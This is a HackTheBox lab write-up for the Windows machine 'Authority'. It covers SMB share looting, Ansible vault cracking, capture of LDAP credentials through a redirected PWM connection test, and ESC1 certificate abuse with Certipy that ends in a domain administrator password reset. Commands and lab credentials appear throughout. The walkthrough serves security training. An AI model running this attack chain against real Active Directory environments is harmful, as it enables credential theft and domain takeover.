---
title: "Authority"
date: 2026-04-12 00:00:00 +0100
categories: [HackTheBox, Machines]
tags:
  - medium
  - windows
---

![Pasted image 20260412122842](/assets/img/posts/2026-04-12-authority/Pasted image 20260412122842.png)

*Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.*

# Enumeration
An initial Nmap scan was performed against the target to identify open ports and running services:

## Nmap
We utilized the following command to conduct a Nmap scan
```bash
Authority ➜ sudo nmap -sV -sC 10.129.17.147          
```
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412140246.png" alt="Nmap Scan" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Nmap Scan</p>
</div>

Initial Nmap enumeration identified a number of open ports of interest, each warranting further investigation.

## SMB Enumeration
Nmap reveals SMB running on the target. Using NetExec with guest authentication, we enumerate available SMB shares.
```bash
Authority ➜ nxc smb authority.htb -u 'guest' -p '' --shares      
```
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412140637.png" alt="SMB Share Enumeration" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">SMB Share Enumeration</p>
</div>

### Dumping Development Share
The `guest` user has read access to the `Development` share. Using `smbclient`, we pull all files and sift through them for sensitive or interesting information.
```bash
Authority ➜ smbclient //authority.htb/'Development' -U Guest                                                                                
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

### Identified Credentials
Digging through the dumped share, the `PWN` folder yields a set of credentials.
![](/assets/img/posts/2026-04-12-authority/Pasted image 20260412141032.png)

## Decrypting Ansible Vault Password
The credentials include an Ansible vault file. Using `ansible2john`, we convert it to a crackable hash format and run it through John the Ripper to recover the master password.
```bash
defaults ➜ ansible2john pwm_admin.hash > pwm_admin.hash.jtrformat 

defaults ➜ john --show pwm_admin.hash.jtrformat
pwm_admin.hash:!@#$%^&*

defaults ➜ cat pwm_admin.hash | ansible-vault decrypt;echo       
```
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412141543.png" alt="Decrypting Password" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Decrypting Password</p>
</div>

Password: `pWm_@dm!N_!23`

## Login Into PWM Portal
With the Ansible vault password recovered, we use it to log into the Password Self Service Portal, gaining access to the configuration editor.
![Pasted image 20260412141753](/assets/img/posts/2026-04-12-authority/Pasted image 20260412141753.png)

### Retrieve SVC_LDAP Password
Access to the configuration editor allows us to redirect the LDAP URL to our attacking machine. Starting a Netcat listener and triggering a connection test, the application leaks the `svc_ldap` credentials in cleartext.

<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412141923.png" alt="Original Values" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Original Values</p>
</div>

#### Modify LDAP URL
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412142022.png" alt="Modified Values" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Modified Values</p>
</div>

#### Force Testing LDAP Profile
With the LDAP URL redirected, we trigger the connection by clicking `Test LDAP Profile` — the application reaches out to our Netcat listener and sends the credentials.
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412142228.png" alt="Captured Credentials" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Captured Credentials</p>
</div>

## Login As `svc_ldap`
Using the recovered `svc_ldap` credentials, we connect to the target over WinRM, successfully gaining a foothold with user privileges.
```bash
Authority ➜ nxc winrm authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' 
WINRM       10.129.17.147   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) 
WINRM       10.129.17.147   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)


Authority ➜ evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' 
```
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412142516.png" alt="Successfully Logged In" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Successfully Logged In</p>
</div>


# Post-Exploitation
User access secured, we begin enumerating privilege escalation vectors. The machine name **Authority** is a classic HTB nudge toward Active Directory Certificate Services — we start our investigation there.

## Post-Enumeration
### Certipy 
Using Certipy, we query Active Directory Certificate Services for misconfigured or exploitable certificate templates.
```bash
Authority ➜ certipy find -vulnerable  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.17.147 -stdout
```

We have identified a misconfigured certificate which we can utilize to gain administrative access on the target machine.
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412143128.png" alt="Identified Misconfigured Certificate" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Identified Misconfigured Certificate</p>
</div>

## Abuse ESC1

### Create Computer
With `MachineAccountQuota` not set to `0`, we can add computer accounts to the domain. We create a machine under our control to satisfy the domain computer enrollment requirement, then abuse ESC1 by setting the UPN to `Administrator` and requesting a certificate — effectively impersonating the domain admin.
```bash
(.venv) addcomputer ➜ addcomputer.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name 'PoC' -computer-pass 'hacker123!'
```
![Pasted image 20260412143538](/assets/img/posts/2026-04-12-authority/Pasted image 20260412143538.png)

### Request Certificate
Our controlled computer account satisfies the enrollment requirement — we exploit ESC1 to request a certificate with the `Administrator` UPN, impersonating the domain admin.
```bash
Authority ➜ certipy req -u 'PoC$' -p 'hacker123!' -dc-ip 10.129.17.147 -target authority.htb -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -sid S-1-5-21-622327497-3269355298-2248959698-500
```
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412143801.png" alt="Retrieved Administrator Pfx" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Retrieved Administrator Pfx</p>
</div>

### Authentication Failed
Attempting to authenticate with the certificate fails — the Domain Controller doesn't support PKINIT, meaning Kerberos pre-authentication via certificates isn't an option here. This is a known limitation on Authority.

**Why PKINIT fails on Authority:**

When you request a certificate via ESC1 with Certipy, the end goal is to use that certificate to authenticate to the DC and get a TGT (Kerberos ticket). This authentication method is called **PKINIT** — it's an extension to Kerberos that allows a certificate to substitute for a password during pre-authentication.

For PKINIT to work, the DC needs to have its own certificate too — specifically a **KDC certificate** — so it can participate in the mutual public-key exchange. On **Authority**, the DC was never properly enrolled with a KDC certificate, meaning it simply cannot process PKINIT requests. It doesn't know how to handle certificate-based Kerberos auth, so it rejects it.
```bash
Authority ➜ certipy auth -dc-ip 10.129.17.147 -pfx administrator.pfx 
```
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412144040.png" alt="Authentication Failed" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Authentication Failed</p>
</div>

### Update Administrator Password
With PKINIT off the table, we fall back to LDAPS authentication. Using Certipy's `-ldap-shell` flag and the Administrator `.pfx`, we obtain an interactive LDAP shell as Administrator and update the password — completing the privilege escalation.
```bash
Authority ➜ certipy auth -dc-ip 10.129.17.147 -pfx administrator.pfx -ldap-shell

change_password administrator hacker123!
```
![Pasted image 20260412144417](/assets/img/posts/2026-04-12-authority/Pasted image 20260412144417.png)

### Login
Password updated, we use Evil-WinRM to log in as Administrator, completing the privilege escalation from user to domain admin.
```bash
Authority ➜ evil-winrm -i authority.htb -u administrator -p 'hacker123!'
```
<div style="text-align:center;margin:1.5rem auto;">
  <img src="/assets/img/posts/2026-04-12-authority/Pasted image 20260412144616.png" alt="Successfully Logged In" style="max-width:100%;border-radius:6px;">
  <p style="font-size:0.82rem;font-style:italic;font-weight:bold;color:#868686;margin-top:0.4rem;">Successfully Logged In</p>
</div>
